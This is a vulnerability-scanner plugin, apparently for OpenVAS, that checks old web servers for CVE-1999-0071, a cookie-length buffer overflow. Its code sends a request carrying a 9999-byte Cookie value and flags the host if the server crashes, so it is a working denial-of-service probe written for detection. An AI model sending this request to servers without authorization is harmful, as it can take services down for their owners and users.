if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11077" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-1999-0071" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "HTTP Cookie overflow" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your software or protect it with a filtering reverse proxy." );
	script_tag( name: "summary", value: "It was possible to kill the web server by
  sending an invalid request with a too long Cookie name or value." );
	script_tag( name: "impact", value: "A cracker may exploit this vulnerability to make your web server
  crash continually or even execute arbirtray code on your system." );
	script_tag( name: "affected", value: "Apache version < 1.1. Other versions or products might be affected
  as well." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
r = http_get( item: "/", port: port );
send( socket: soc, data: r );
h = http_recv_headers2( socket: soc );
r = http_recv_body( socket: soc, headers: h );
close( soc );
ck = egrep( pattern: "^Set-Cookie: ", string: h );
ckn = "VT-Test";
if(ck){
	ckn = ereg_replace( string: ck, pattern: "^Set-Cookie: +([^=;]+)=.*", replace: "\\1" );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
r = http_get( item: "/", port: port );
r = r - NASLString( "\\r\\n\\r\\n" );
r = NASLString( r, "\\r\\n", "Cookie: ", ckn, "=", crap( 9999 ), "\\r\\n\\r\\n" );
send( socket: soc, data: r );
r = http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port, retry: 2 )){
	security_message( port );
	exit( 0 );
}
exit( 99 );

